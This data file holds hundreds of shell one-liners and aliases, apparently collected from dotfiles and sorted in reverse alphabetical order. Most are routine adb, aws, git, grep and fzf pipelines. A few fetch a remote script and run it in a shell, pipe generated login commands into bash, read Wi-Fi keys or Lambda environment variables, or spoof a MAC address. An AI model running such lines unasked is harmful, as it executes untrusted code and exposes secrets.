brew cask list -1 | xargs brew cask rm
brew --prefix emacs-plus | open_brew_emacs
branchname=`git branch --no-color 2> /dev/null | sed -e
branches|head
branches | colify 3
branch_name=$(git_recent_branches | fzf); git add . && git stash save $branch_name && git co $branch_name
brake -T | g? $1
boot2docker ip | pbcopy
bloop projects --dot-graph | dot -Tpdf -o dependency-graph.pdf && xdg-open dependency-graph.pdf
blkid|sort
blkid|grep --color
blkid | sort -r
black | \
black . --exclude 'venv3/|.tox/'
bjobs |wc -l
bjobs | tail
bjobs | head
bjobs | grep RUN
bjobs | grep $USER
bjobs -w | egrep -i
bjobs -noheader -u all -P $LSB_DEFAULTPROJECT | awk
bjobs -aw | tail
bjobs -aw | grep -i
bitcoind -daemon | tail -f $HOME/Library/Application\ Support/Bitcoin/debug.log
bitbake-layers show-recipes | grep
bitbake -k core-image-minimal 2>&1 | tee errors.txt
bindkey|grep fzf
bindkey | sort
bindkey | head -n 23
bindkey | grep -F
bindkey | grep
bindkey | fzf > /dev/null
bind -p | sed '/self.insert/d;/^#/d;/do-lowercase/d'
bind -p | less
bind -P | less
bind -P | grep 'can be'
bin/spring rails routes | fzf
bin/rspec $(git status | grep spec)
bin/rake routes | grep $@
bin/rake routes | grep
bin/rake routes | fzf
bin/rake -T | grep
bin-list >| /tmp/linolium-dmenu
big | head
bi | xargs -I {} git stash save {}
bhosts | awk
bh | fzy
bfs | rg
benchmark_hdd_write > /dev/null 2>&1 && dd if=tstfile bs=1024k of=/dev/null count=1024 2>&1 | grep bytes
beet_strip_path.sh | mpc add
beet ls -a | grep -i
be rspec \$(git diff --name-only master.. spec/ | grep _spec)
be rake routes | rg
be rake routes | grep $1
be rake routes | grep
be rake -T | grep
be rails db < `ls -1tr ~/tmp/mysql_dump* | tail -n 1`
be pronto run --commit=$(git log --pretty=format:%H | tail -1)
bcloud build --update 2>&1 | tee bbuild.log
bc -l | sed
bbff | cowthink
bazel run //:buildifier_check && bazel query 'tests(//...)' | grep -v
bazel run //:buildifier_check && bazel query 'tests(//...)' | SHLVL=1 xargs bazel test --test_summary=terse --test_output=errors
bauerbill -Ss --aur $(aurman -Qm) | grep
battery_all | grep percentage
bat ~/.zshrc | rg
bat package.json | jq .scripts -r
bat $(ls | peco)
bat $(findsrc -type f | fzfbat)
bat $(find . -type f | peco)
bat $(find -type f | fzfbat)
bash-keybinds | less -R
bash ~/ufetch-arch | lolcat
bash compile_script.sh | /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --kiosk http://localhost:8888/
bash -c 'cat \`cat .viminfo | grep \
bash (curl -s $laptop_script_url|psub)
basename $PWD | tabset -t
basename $(pwd) | figlet
base64 </dev/urandom | lolcat
base64 < /dev/urandom | head -c
base64 /dev/urandom | head -c
base64 /dev/urandom | grep -i --color
base64 -d | xz -d
base64 -d | gpg -d
base64 -D | xmllint --format -
base64 --decode | gpg
bake routes | grep
babel src/js/*.js | uglifyjs > dist/js
ba | grep
b | grep -v 0d04f84
b getnetworkinfo | grep subversion
az vm list -g research-remote --query '[].name' --output tsv | sort -V
az account show -o json | jq -r '.name'
awslogs get $1 ALL -s1h --watch | sed -e
aws_otp | tee >(pbcopy) && echo '=> Copied AWS OTP to pasteboard.'
aws_info | grep IpOwnerId
aws-vault --debug login --federation-token-ttl=8h --assume-role-ttl=1h --stdout --no-session $p | xargs -t /Applications/Google\ Chrome\ Canary.app/Contents/MacOS/Google\ Chrome\ Canary --args --no-first-run --disable-async-dns --new-window -disk-cache-dir=$(mktemp -d /tmp/chromecanary.XXXXXX) --user-data-dir=$(mktemp -d /tmp/chromecanary.XXXXXX)
aws-ip; lsof -ti:8157 | xargs kill -9; ssh -i ~/.ssh/aws-key-$instanceId.pem -f -N -L 8157:127.0.0.1:8888 ubuntu@$instanceIp
aws-all-regions | xargs -n 1 aws cloudformation list-stacks --query
aws sts get-caller-identity | jq -r .Account
aws sts get-caller-identity | jq -r '.Arn'
aws sns list-topics | jq .Topics[].TopicArn
aws sns list-subscriptions | jq .[][].SubscriptionArn
aws s3api get-bucket-tagging --query 'TagSet[?Key==\`aws:cloudformation:stack-name\`] | [0].Value' --output text --bucket
aws s3 ls | cut -d ' ' -f3
aws opsworks --region us-east-1 describe-deployments --stack-id e1441554-afd3-4798-8255-bb0358ea2b46 | grep -C 5
aws logs describe-log-groups | jq -r '.logGroups[].logGroupName'
aws lambda get-function-configuration --function-name dss-dev | jq .Environment.Variables
aws iam list-account-aliases | jq -r \
aws ecs list-services --cluster ecscluster-staging --profile ecs-describe | grep marina
aws ecr get-login --region=us-east-1 --no-include-email | bash
aws ecr get-login --region us-east-1 --no-include-email | sh
aws ecr get-login --no-include-email | sh
aws ecr get-login --no-include-email | bash
aws ecr get-login --no-include-email --region us-west-2 | sh
aws ecr get-login --no-include-email --region us-east-1 |sh
aws ecr get-login --no-include-email --region us-east-1 | sh
aws ecr get-login --no-include-email --region us-east-1 | bash
aws ecr get-login --no-include-email --profile=cloudsight | pbcopy
aws ecr --region $AWS_REGION get-login --no-include-email | bash
aws ec2 describe-vpcs | jq .Vpcs[].CidrBlock
aws ec2 describe-subnets | jq .Subnets[].CidrBlock
aws ec2 describe-instances | json Reservations[4].Instances[0].PublicIpAddress
aws ec2 describe-instances | json Reservations[3].Instances[0].PublicIpAddress
aws ec2 describe-instances | json Reservations[2].Instances[0].PublicIpAddress
aws ec2 describe-instances | json Reservations[1].Instances[0].PublicIpAddress
aws ec2 describe-instances | json Reservations[0].Instances[0].PublicIpAddress
aws ec2 describe-instances | jq
aws ec2 describe-instances --query 'Reservations[].Instances[].[Tags[?Key==\`aws:cloudformation:stack-name\`] | [0].Value]' --output text --instance-ids
aws ec2 describe-instances --instance-id=$(cat .vagrant/machines/default/aws/id) | jq -r .Reservations[].Instances[].PrivateIpAddress
aws ec2 authorize-security-group-ingress --group-id sg-ef697c88 --protocol tcp --port 5432 --cidr $(curl ifconfig.co)/32 | echo $(curl ifconfig.co) >> ~/whitelisted.txt
aws ec2 authorize-security-group-ingress --group-id sg-de697cb9 --protocol tcp --port 5432 --cidr $(curl ifconfig.co)/32 | echo $(curl ifconfig.co) >> ~/whitelisted.txt
aws ec2 authorize-security-group-ingress --group-id sg-2ec6c849 --protocol tcp --port 22 --cidr $(curl ifconfig.co)/32 | echo $(curl ifconfig.co) >> ~/whitelisted.txt
aws ec2 authorize-security-group-ingress --group-id sg-1bc6c87c --protocol tcp --port 22 --cidr $(curl ifconfig.co)/32 | echo $(curl ifconfig.co) >> ~/whitelisted.txt
aws dynamodb list-tables | jq .TableNames[]
aws autoscaling describe-auto-scaling-groups | grep
aws --profile docker-registry ecr get-login --no-include-email |bash
aws --no-include-email --region=us-east-1 ecr get-login |sh
awk -F= '/^(psk|id)/{print $2}' /etc/NetworkManager/system-connections/\
awk -F'|' '{print NF; exit}'
awk -F '|' 'NR>=3{a[\$1]+=\$3;} END { for(i in a) print i \
awk -F '/' '{print $2}' $1|uniq -c
awk '{print \$NF}' |peco
awk '{print \$2}' | xargs kill $@
awk '{print \$2}' | xargs kill
awk '{print \$1}' |peco
awk '{print \$1}' | xargs kill
awk '{print $2}' <(ifconfig wlp58s0 | grep 'inet');
awk '{print $1}' |
awk '{print $1 }' | tr -d ':'
awk '{ print \$1 }' | awk '{s+=\$1}END{print s/NR}'
awk '{ for(i = 1; i <= NF; ++i) print \$i*1000 }' | spark
awk 'seen[$0]++{print|\
awk 'BEGIN { for(key in FUNCTAB) print FUNCTAB[key] }' | sort
awk '/^function/ {print \$2}' $SEPATH | sort
awk '/^\s*[^#]/ { print \$2 }' | uniq
awk '/^\s*[^#]/ { print \$1 }' | uniq
awk '/KB|JNM/ {sum+=\$2; print} END {print \
awk '/Command Line History/{p=1}/^ *$/{p=0}p' ~/.viminfo | awk '{a[\$1]++}END{for(i in a){print a[i] \
awk '/.prod|.preprod/ { print \$NF }' ~/.ssh/config
awk '!/colfax/' | sort -k1nr"
awk '!/^\*/ {print \$1}' | \
avcshowrecent | audit2why
avcshowrecent | audit2allow
avcshow10 | audit2why
avcshow10 | audit2allow
avcshow | tail -30
avcshow | audit2why
avcshow | audit2allow
autoTestCSharp | gawk -f ~/dotfiles/nvim/testnet.awk
aurman -Qdtq | sudo aurman -Rs -
aurman -Qdtq | aurman -Rs -
aurinstalled | sort > $CONF_DIR/setup/aurlist
aur repo --list -d aur | aur vercmp
au | sort -n
atq | sort -k 3
atq | sort
atom $(find node_modules -maxdepth 1 -type d | peco)
assistant &>/dev/null&|
askpass.sh | ssh-add -
asdf plugin-list | xargs -Iplugin sh -c 'echo reshim plugin && asdf reshim plugin'
asciiquarium | lolcat
asciinema rec /tmp/temp.cast --overwrite && cat /tmp/temp.cast | svg-term > recording.svg
asana tasks | peco
arp `hostname` | awk -F'[()]' '{print $2}'
arp -na | grep -i b8:27:eb
arp -an | grep b8
arp -a |tr - :
arp -a | grep -v incomplete
arp -a | awk
arp -a -n | grep b8:27:eb:
aria2c -d /Volumes/Sol\ \|\ Orbit/Torrents/ $1
args=$@;ps -eaf | grep $args
arecord | aplay
arecord -v -f cd -t raw | lame -r -b 192 - dump.mp3
arecord -t wav -f dat -q | lame -b 128 -m s - out.mp3
arecord -f dat | ssh -C evanii@192.169.1.111 aplay -f dat
arecord -f cd -t raw | oggenc - -r -o out.ogg
arecord -f cd -t raw | oggenc - -r -o $HOME/out_audio.ogg
archnews.py|head -n 10
archey3 | lolcat
arc-revision | xargs arc diff --update
apulse32 skype &|
apt-show-versions | grep
apt-show-versions -a | grep -i
apt-mark showmanual | less
apt-mark showauto | xargs apt-get install
apt-mark showauto | xargs -n 1 apt-mark manual
apt-get list --installed | grep
apt-get install -y $(cat ~/.dotfiles/backups/package.list | awk '{print $1}')
apt-get install $(apt-show-versions -u -b | grep security)
apt-get -s upgrade| awk -F'[][() ]+' '/^Inst/{printf \
apt-config dump | grep Language
apt-cache show | grep Version
apt-cache search nvidia- | grep -e
apt-cache pkgnames | sort
apt-cache pkgnames | egrep
apt policy | grep ppa
apt list|grep $*
apt list | grep -v installed
apt list 2>/dev/null | grep
apt list --upgradable | less -R
apt list --upgradable | less
apt list --installed | less
apt list --installed | grep -i
apt list --installed | grep $1
apt list --installed | grep
apt list --installed | g
apt list --all-versions | grep $1
apt -s dist-upgrade | grep \
apropos . | less
apropos . | fzf --height 10
app/console | grep $1
app/console doctrine:migrations:latest | pbcopy
apm list --installed --bare | grep '^[^@]\+' -o
aplay ~/Documents/wat.wav > /dev/null 2>&1 &|
aplay -l | grep card
aplay -l | awk -F \:
aplay -L | grep :CARD
apk list -I | grep -i
apk -vv info|sort
apg -a1 -m 15 -n 1 -MNCL | xsel -bi
apg -a 1 -m 20 -n 20 | tail -1
apg -M SNCL -E '[]{}#%^*+=_\|~<>' -m 8 -x 12
apcaccess status | grep -E
apachectl fullstatus | egrep
apachectl -V | grep httpd.conf
apache2ctl -V | grep SERVER_CONFIG_FILE
any | xargs open
antibody bundle < ~/.zsh/plugins.txt >| ~/.zsh/plugins.zsh
ansiweather | lolcat
ansiweather | awk '{print $1 $2 $8 $9 $10}'
ansifilter | pbcopy
ansible-vault-encrypt-oneline-string | pbcopy
ansible-vault view ~/Dropbox/random/words/passwords.yml | less
anonimity-filter | pbcopy
animal | lolcat -a -p .5 -d 4
android list target | less
anamnesis -l 200 | peco
amixer sget Master | sed -n '/ft:/{;s/.* \[\([0-9]\+%\).*\]/\1/;p;}'
amixer set Master toggle | awk '/\[o.*\]/{print \$6}'
amixer -D pulse | grep %
alog | grep
allpy | xargs grep
allm | xargs grep
allh | xargs grep
allcph | xargs grep
allcp | xargs grep
allch | xargs grep
allccph | xargs grep
allc | xargs grep
all | l
alias|sed's/=.*//'
alias|less
alias|grp
alias|grepc
alias|grep tmux
alias|grep git
alias|grep -i --color=AUTO
alias|grep -i
alias|grep --color
alias|grep 'git'
alias|grep
alias|cut -d' ' -f 2-
aliases | ack git
alias |more
alias |less
alias |grep git
alias |grep ' rl'
alias |grep ' rk'
alias |grep
alias |cut -d
alias | which -i
alias | which -a --tty-only --read-alias --show-dot --show-tilde
alias | which --tty-only --read-alias --show-dot --show-tilde
alias | which --all --tty-only -i --show-dot --show-tilde
alias | wc -l
alias | sort -fu
alias | sort
alias | shuf -n 1
alias | sed -r 's/alias ([^=]*)=.*/\1/'
alias | sed 's/alias //; s/=.*//'
alias | sed 's/=.*//'
alias | rg
alias | red-grep
alias | peco
alias | more
alias | less -M
alias | less
alias | le
alias | ig
alias | h -ni = alias /home/x com DL togezer tgz git cd kill
alias | gwhich --tty-only --read-alias --show-dot --show-tilde
alias | gwhich --read-alias --show-dot --show-tilde
alias | grep zoom
alias | grep vnc
alias | grep toybox
alias | grep tmux
alias | grep terraform
alias | grep sublime
alias | grep ssh
alias | grep raylib
alias | grep nodejs
alias | grep neo4j
alias | grep log; echo listhackers; echo wwhois; echo mountusb; echo umountusb
alias | grep jdk
alias | grep hub
alias | grep gradle
alias | grep golang
alias | grep go
alias | grep git-
alias | grep git
alias | grep flutter
alias | grep f[a-z]=
alias | grep ebpf
alias | grep cmake
alias | grep clion
alias | grep cd
alias | grep busybox
alias | grep bookmark
alias | grep blender
alias | grep ^é
alias | grep ^è
alias | grep ^pac
alias | grep ^dk
alias | grep \
alias | grep [s]ys ; $HOME/bin/lsfunction -f sys%
alias | grep [r]vm
alias | grep ResetGlobbing
alias | grep -w git
alias | grep -v
alias | grep -i log
alias | grep -i cd
alias | grep -i --
alias | grep -i
alias | grep -E \
alias | grep -E
alias | grep --extended-regexp --ignore-case
alias | grep --color=never youtube
alias | grep --color=never yay
alias | grep --color=never systemctl
alias | grep --color=never pacman
alias | grep --color=never npm
alias | grep --color=never ls
alias | grep --color=never grep
alias | grep --color=never docker
alias | grep --color=never -i -e
alias | grep --
alias | grep 'sm_'
alias | grep 'ls '
alias | grep 'en_'
alias | grep '`dirname \
alias | grep '_'
alias | grep '^g'
alias | grep '$1'
alias | grep $lookfor
alias | grep $@
alias | grep $1
alias | grep $*
alias | grep $(echo $1)
alias | grep
alias | fzf -x --cycle
alias | fzf
alias | egrep \
alias | egrep -i
alias | egrep --color -i
alias | egrep (\
alias | egrep
alias | command which --tty-only --read-alias --show-dot --show-tilde
alias | command grep -E '^[A-Z]'
alias | bat -l=bash --paging=never
alias | bat -l zsh --style plain
alias | awk -F'[ =]' '{print ${2}}'
alias | ag
alias | ack
alias | a
alias | /usr/local/bin/which -a --tty-only --read-alias --show-dot --show-tilde
alias | /usr/local/bin/which --tty-only --read-alias --show-dot --show-tilde
alias | /usr/local/bin/gwhich --tty-only --read-alias --show-dot --show-tilde
alias | /usr/bin/which -i --tty-only --show-dot --show-tilde
alias | /usr/bin/which -a
alias | /usr/bin/which --tty-only -i --show-dot --show-tilde
alias | /usr/bin/which --tty-only --read-alias --show-tilde --show-dot
alias | /usr/bin/which --tty-only --read-alias --show-dot --show-title
alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tiled
alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde --read-functions
alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde
alias | /usr/bin/which --read-alias
alias | /usr/bin/which
alias | /usr/bin/env which --tty-only --read-alias --show-dot --show-tilde
alias | /bin/which --tty-only --read-alias --show-dot --show-tilde
alias | $dotdot/which.perl -a
alias | $FZF_COMMAND
alias git branch -r | xargs -t -n 1 git branch -r --contains
alias 2>&1| grep
alias -p | sed -e 's/^alias //' -e 's/=.*$//'
alias -p | grep -i
alias -p | grep
alias -p && cat ~/.bash_functions | grep function
ali | ep
alert_helper|wall
al | grep $1
airport -s | awk 'NR > 1 {print `$1`}'
airport -I|awk '/^ *SSID/ {print $2}'
airport -I | grep \
airport -I | awk '/lastTxRate/{print\$0\
airport --scan | ksort -h -c 3 -r
air -s | sort
ag -lU|fzf
ag -l | fzf
ag -l | entr reload-browser \
ag -l | entr reload-browser Safari
ag -l | entr -s $1
ag -l | entr -rc vendor/bin/phpunit --printer='Codedungeon\\PHPUnitPrettyResultPrinter\\Printer'
ag -l | entr -rc
ag -l | entr -r go run
ag -l | entr -r
ag -l | dirtree -o dirtree.html && google-chrome-stable dirtree.html
ag -l | ctags -e -L -
ag -l | ctags -L-
ag -l | ctags --links=no -L-
ag -l --python |entr pytest
ag -l --html|entr touch manage.py &
ag -l 'binding.pry' | xargs sed --in-place '/binding.pry/d'
ag -l '.' | ag
ag -G \.\(html\|html\)
ag -G 'test\.(clj|cljs)$'
ag -G '\.(css|less)$' -Q
ag -G '\.(clj|cljs)$' -Q
ag -G '\.(clj|cljs)$'
ag -G '(?!test)\.(clj|cljs)$'
ag --print0 -l '[ \t]+$' | xargs -0 -n1 -r perl -pi -e 's/[ \t]+$//'
ag --nogroup '(TODO|FIX(ME)?)[: ]'
ag --nogroup '(TODO|FIX(ME)?):'
ag --nofilename . ~/.zlogs | fzf --tac --no-sort
ag --nobreak --nonumbers --noheading . | fzf-tmux
ag --nobreak --nonumbers --noheading . | fzf -e +i
ag --nobreak --nonumbers --noheading . | fzf
ag --nobreak --nonumbers --noheading --python . | fzf -e +i
ag --nobreak --nonumbers --noheading '.' $(git rev-parse --show-toplevel) | fzf
ag --nobreak --noheading ~/Documents/ | fzf
ag --nobreak --noheading . | fzf
ag --ignore TAGS --ignore vendor binding\.pry\|debugger\;
ag --hidden --nobreak --nonumbers --noheading . | fzf
ag --help | less
ag --follow --hidden --nobreak --nonumbers --noheading . | fzf
ag (TODO|FIXME)\:?
ag ' $' *.(c|h)
ag $1 --files-with-matches | xargs -I {} sed -i '.back' -e \
afs -F'|'
advice | cowsay
addr=$(openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'); sudo ifconfig en0 ether $addr;
addcr | lpr -P$PRINTER
adbpack | grep -o -e 'com.opera.max.[^p].*'
adbopera | xargs -r adb uninstall
adbopera | xargs -r adb shell pm clear
adbcon; ./repeat.sh 1 adb shell dumpsys activity activities | grep Run
adb_peco_package | xargs -I % adb_all shell pm clear %
adb-pm-ls | rgp
adb-pm-ls | grep
adb-data | _adb_pull
adb wait-for-device; ! adb root | grep -e already && adb wait-for-device; adb shell rm /data/system/users/0/package-restrictions.xml && adb reboot
adb wait-for-device shell cat /proc/kmsg | grep ts
adb wait-for-device logcat -b radio|tee >> $home_dir/r1-$(date +
adb shell setprop log.tag.GAv4 ERROR & adb logcat -v brief | pidcat
adb shell screenrecord --output-format=h264 - | ffplay -
adb shell screenrecord --output-format h264 - | ffplay -
adb shell screencap -p | sed 's/\r//' > adb_\`date +%Y%m%d%H%M%S\`.png
adb shell screencap -p | sed 's/\r$//' >!
adb shell screencap -p | sed 's/\r$//' > screen.png
adb shell screencap -p | sed 's/\r$//' >
adb shell screencap -p | sed
adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' > ~/Downloads/screenshot.png
adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' > ~/Desktop/screen.png
adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' > screen.png
adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' > screen-`date \
adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' >
adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g'
adb shell screencap -p | perl -pe
adb shell ps | grep ascom
adb shell ps | grep
adb shell pm list packages | grep ticker
adb shell pm list packages | grep
adb shell pm list packages | awk -F ':' '{print $2}'
adb shell pm list packages | awk -F
adb shell pm list packages -f | sort
adb shell pm list packages -f | grep credenceid
adb shell pm -l | grep
adb shell ls -Rl /data/data | peco
adb shell logcat | ndk-stack -sym $ANDROID_SO_V7
adb shell logcat | ndk-stack -sym $ANDROID_SO
adb shell ip route | awk '{print \$9}'
adb shell ifconfig | grep wlan0 -A 1
adb shell ifconfig | grep Mask
adb shell getprop | grep version
adb shell getprop | grep ro.semc.version
adb shell getprop | grep product
adb shell getprop | grep
adb shell dumpsys | grep GLES
adb shell dumpsys window | grep mCurrentFocus
adb shell dumpsys window windows | grep mCurrentFocus
adb shell dumpsys window windows | grep -E 'mCurrentFocus'
adb shell dumpsys window windows | grep -E
adb shell dumpsys window windows | grep
adb shell dumpsys notification | less
adb shell dumpsys meminfo | grep \
adb shell dumpsys display | grep DisplayDeviceInfo
adb shell dumpsys battery | grep level
adb shell dumpsys activity | grep top-activity
adb shell dumpsys activity | grep mFocusedActivity
adb shell dumpsys activity | grep mFocused
adb shell dumpsys activity | grep -i run
adb shell dumpsys activity | grep -B 1 \
adb shell dumpsys activity top | grep ACTIVITY
adb shell dumpsys activity activities | grep mResumedActivity
adb shell dumpsys activity activities | grep mFocusedActivity
adb shell dumpsys activity activities | grep PausedActivity
adb shell dmesg | vi
adb shell dmesg | grep sensorhub]
adb shell content query --uri content://settings/secure --projection name:value | grep android_id
adb shell cat /proc/kmsg | tee kernel.log
adb shell NfcMiddlewareSimulator c | tee mw_log.txt
adb shell 'pm list packages -f' | cut -f 2 -d '='
adb reverse tcp:8081 tcp:8081 | echo 'adb : reverse tcp:8081'
adb pull /sys/fs/selinux/policy $home_dir/ && adb logcat -b all -d | audit2allow -p policy
adb pull /sys/fs/selinux/policy $home_dir && adb logcat -b all -d | audit2allow -p $home_dir/policy
adb pull /sdcard/Screenshots/`adb shell ls -t /sdcard/Screenshots/ | head -1` ~/Desktop
adb logcat|grep
adb logcat –d | ~/p4_managed/BejBlitz/adapt_touch_engineer/BejBlitz/projects/android/ndk-symbolicate ~/p4_managed/BejBlitz/adapt_touch_engineer/BejBlitz/projects/android/obj/local/armeabi
adb logcat | ~/scripts/colorLogcat.py
adb logcat | ~/coloredlogcat.py
adb logcat | ndk-stack -sym $1
adb logcat | lolcat
adb logcat | grep com.credenceid
adb logcat | grep GilLog
adb logcat | grep E/GeckoConsole
adb logcat | grep CONSOLE
adb logcat | grep -v \
adb logcat | grep -iE
adb logcat | grep -i trainscorekeeper
adb logcat | grep -i
adb logcat | grep -e 'Unity'
adb logcat | grep -A 20 FATAL
adb logcat | grep
adb logcat | findstr
adb logcat | coloredlogcat.py
adb logcat | ag
adb logcat | adb-logcat-pp
adb logcat | /home/manjusaka/bin/coloredlogcat.py
adb logcat | $COLOR_PY
adb logcat \*:W | coloredlogcat.py
adb logcat \*:E | coloredlogcat.py
adb logcat -v time | grep -i
adb logcat -v time | grep -e
adb logcat -v time | grep --color
adb logcat -v time *:i |grep /XCHome
adb logcat -v threadtime| grep AndroidRuntime
adb logcat -v threadtime| grep -E --color $*
adb logcat -v threadtime| grep --color -E
adb logcat -v threadtime |grep HealthTag
adb logcat -v threadtime | tee temp.logcat
adb logcat -v threadtime | tee device.log
adb logcat -v threadtime | tee `date +%F-%H%M%S.log`
adb logcat -v threadtime | grep lasa
adb logcat -v threadtime | grep bohrium
adb logcat -v threadtime | grep aios
adb logcat -v threadtime | grep -v nativeGetEnabledTags
adb logcat -v threadtime | grep -e DD
adb logcat -v brief | pidcat
adb logcat -s ClassCloud | grep $1
adb logcat -s CastController | grep $1
adb logcat -d | less
adb logcat -d | grep -i trainscorekeeper
adb logcat -d -v threadtime | grep bohrium
adb logcat -c;adb logcat | grep -i trainscorekeeper
adb logcat -c;adb logcat -v threadtime | grep bohrium
adb logcat -c | adb logcat -v time
adb logcat -c >/dev/null 2>&1 && adb logcat | tee tlog.TNT
adb logcat -c && adb logcat -v threadtime 2>&1 | tee /tmp/logcat.txt
adb logcat -b radio| colored-logcat
adb logcat -b radio | /home/manjusaka/bin/coloredlogcat.py
adb logcat -b main| colored-logcat
adb logcat -b main -b system -b radio -v time　| grep -E --color $*
adb logcat -b all | grep
adb logcat -C | grep -i $0
adb logcat -C | grep $0
adb logcat *:i |grep /XCHome
adb install -r -d \`fd -I -t f apk\$ | peco\`
adb exec-out screenrecord --output-format=h264 - | mpv -
adb exec-out screencap -p | impbcopy -
adb devices -l | tail -n +2
adb -s 192.168.100.100:5555 logcat |grep Alarm
adb -e shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' > ~/Pictures/ss-emulator/ss_${DATE_FORMAT}.png
adb -d logcat -v time com.liulishuo.engzo:I | grep -e
ad | htmail
ad term | lr
acpi | awk -F\
acpi -b | sed -e 's/.* \([0-9]*\)%.*$/\1/g'
acpi -b | grep Battery
acpi -b | awk '{ print \$5 }'
acpi -V | grep Battery
acpi -V | grep -i battery
acl | grep
ack VERSION_NAME gradle.properties | sed -En \
ack -n --nogroup '(TODO|FIX(ME)?):' -R err.txt generated.file succ.txt
ack -n --nogroup '(TODO|FIX(ME)?):'
ack -n --nogroup '(TODO|FIX(ME)>):'
ack -l '<<<' | xargs -o vim -O
ack -l $@ | xargs gvim -p
ack -f | xargs perl -pi -e 's/ +$//'
ack -f | ctags -L -
ack -f | ack -i
ack -f | ack
ack -f --perl | cscope -b -q -i -
ack -aih --output='\$1' '^use\s(.*);' | sort -u
ack -a -f | ack -i
ack -a -f | ack
ack --python --ignore-dir=locale -f . $VIRTUAL_ENV | ctags -L -
ack --nogroup '(TODO|FIX(ME)?):'
ack --noenv -a -f | ack -i
ack --noenv -a -f | ack
ack --nocolor '^\s*(class|def).*:'
ack --help | less
ack --group --color \!* | less -XR
ack --flush --passthru --color --color-match=yellow ""WARNING:"" |
ack --flush --passthru --color --color-match=red ""ERROR:"" |
ack --flush --passthru --color --color-match=green ""INFO:"" |
ack --css '\d*\.\d*px' && ack --css -i '#[-_a-z][-_a-z0-9]*(?=[^}]*\{)' && ack --css -i 'background:\s*#[a-f0-9]*;' && ack --css '\b0(px|r?em)'
ack '(TODO|FIX(ME)?):'
ack '(TODO|FIX(ME)?)'
acestream-launcher $(xsel --clipboard --output | sed q1)
accurev stat err.txt generated.file succ.txt | grep -v backed
aaAptInstall apt-transport-https ca-certificates curl gnupg-agent software-properties-common;curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -;sudo add-apt-repository \
a=\`find . -maxdepth 1 -type d | fzf\`; if [ \$a ]; then cd \$a; fi; unset a
a=(`ls -1`) ; ls -1 | cat -n ; read b ; cd ${a[$b-1]}
a | more
a | m
a | grep NVardell
a dut list -f | grep
a dut list -a | grep
`who am i | sed -n 's/.*(\(.*\))/\1/p'`
`which -a tmux | tail -n 1` new-session -AD -s 0
`wc -w $f | cut -f1 -d' ‘`
`wc -l $f | cut -f1 -d' '`
`unset DATABASE_URL ; cat ~/dev/dapi/conf/test.env| grep -i postgres`
`unset DATABASE_URL ; cat ~/dev/dapi/conf/prod.env| grep -i postgres`
`unset DATABASE_URL ; cat ~/dev/dapi/conf/livestage.env| grep -i postgres`
`ls -t *.pl | head -1 `
`ls --group-directories-first -Htr | tail -1`
`locate macros/less.sh | head -n1`
`kubectl config get-contexts -o=name | peco `
`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`
`gpu 2>&1 |tail -n2`
`git tag | peco`
`git remote | peco`
`git push 2>&1 | grep git`
`git ls-files | peco`
`git ls-files | peco `
`git ls-files | FZF`
`git ls-files --cached | peco`
`git log --graph --pretty=format:'%h - %d %s (%cr) <%an>' | vim -R -c 'set filetype=git nowrap' -`
`git branch | peco`
`fc -n -l -1`|less
`fc -ln -1` | fpp
`echo $appPath | sed -e 's/ /\\\\ /g'`
`brew ls gettext | fgrep bin/envsubst`
`\history -n | tail -n1`
`!!` | head -1
_|___/
_with_fzf cat | less -SRi
_terraform plan | landscape
_task_link | clipcopy
_strlencountchars () { echo -n $1|wc -m; }; _strlencountchars
_strlencountbytes () { echo -n $1|wc -c; }; _strlencountbytes
_show_answers | less
_setv(){ env | grep ^$1; }; _setv
_rgg () { rg --color always --heading $@ | less }; _rgg
_psresources -r|less -S
_psresources -m|less -S
_psresources --sort -%mem|less -S
_psresources --sort -%cpu|less -S
_lscolors | column -s\
_ln() { ls -l $1 | wc -l;}; _ln
_list_themes|less
_list_plugins|less
_ita2eng(){ echo $1 |
_git_pick_any_branches | _copy
_git_commit_last | _copy_and_print
_git_branch_name | _copy_and_print
_g(){ gradle $* --console=plain 2>&1 | tee g.out ; }; _g
_g(){ gradle $* --console=plain --info 2>&1 | tee g.out ; }; _g
_g(){ gradle $* --console=plain --debug -S 2>&1 | tee g.out ; }; _g
_f(){ pwd=$(pwd); cd ${1:-.}; ls | fullpath; cd $pwd; }; _f
_eng2ita(){ echo $1 |
_agg () { rg --group $@ | less }; _agg
_agg () { ag --group $@ | less }; _agg
__svn_diffzip _7zdiffd 2>/dev/null | wc -l
__spec_dirs | grep -v acceptance
__repo_ls_remote | xargs -P 10 -I{} git -C {} pull;
__repo_ls_remote | xargs -I{} git -C {} push;
__alias() {; alias $@ | pygmentize -s -l sh; }; __alias
__IN_GHQ__REPO=1 ghq look $(ghq list |fzf)
_PWD=$PWD; cd $CB_BASE; cb_housekeeping 2>&1 | tee ~/.cb_housekeeping.log; cd $_PWD
_PWD=$PWD; cd $CB_BASE; cb_bootstrap 2>&1 | tee ~/.cb_bootstrap.log; cd $_PWD
_(){ tree -C $* | less -r; }; _
_(){ lsh $@| grep ~$; }; _
_(){ lsh $@| grep ^d; }; _
_(){ lsh $@| grep /$; }; _
_(){ ll $@| \grep ^d; }; _
_(){ hdfs dfs -cat $1 | wc -l ;}; _
_(){ hdfs dfs -cat $1 | less ;}; _
_(){ git symbolic-ref HEAD|sed s#refs/heads/##; }; _
_(){ find . -iname $1 -exec readlink -f {} + | tee ./$1.txt; }; _
_(){ cygpath $1 `pwd` | putclip -d; };_
_(){ cat $1 | putclip; };_
_() { ls | grep $*; }; _
_() { ls -l | grep $*; }; _
_() { ls -a | grep $*; }; _
_() { find $1 -regex $2 | xargs zathura & }; _
_() { find $1 -name $2 | xargs zathura &}; _
_() { f | grep $*; }; _
